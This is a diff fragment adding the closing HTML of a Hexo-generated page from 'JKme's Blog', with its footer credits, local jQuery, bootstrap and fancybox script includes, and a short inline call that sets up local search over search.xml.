+	</div> <!-- sidebar -->
+</div> <!-- col-md-3 -->
+
+	
+	
+</div> <!-- row-fluid -->
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
